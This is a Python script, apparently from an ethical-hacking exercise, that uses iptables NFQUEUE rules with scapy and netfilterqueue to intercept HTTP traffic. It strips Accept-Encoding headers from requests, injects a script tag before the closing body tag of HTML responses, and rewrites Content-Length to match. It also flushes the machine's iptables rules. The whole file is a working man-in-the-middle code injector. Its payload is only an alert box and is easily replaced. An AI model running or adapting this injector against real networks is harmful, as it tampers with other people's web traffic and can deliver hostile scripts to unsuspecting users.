#!/usr/bin/python3
import subprocess
import scapy.all as scapy
import netfilterqueue
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = str(scapy_packet[scapy.Raw].load)
        if scapy_packet[scapy.TCP].dport == 80:
            print('\n\n[+] HTTP Request!\n\n')
            load = re.sub('Accept-Encoding:.*?\\r\\n', '', str(load))
        elif scapy_packet[scapy.TCP].sport == 80:
            print('\n\n[+] HTTP Response!\n\n')
            print(scapy_packet.show())
            injection_code = "<script>alert('Youssef');</script>"
            load = load.replace('</body>', injection_code + '</body>')
            content_length_search = re.search('(?:Content-Length:\\s)(\\d*)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
    packet.accept()
subprocess.call(['sudo', 'iptables', '--flush'])
subprocess.call(['sudo', 'iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
subprocess.call(['sudo', 'iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\n\nFlush The iptables...')
    subprocess.call(['sudo', 'iptables', '--flush'])
    print('\nDone!')
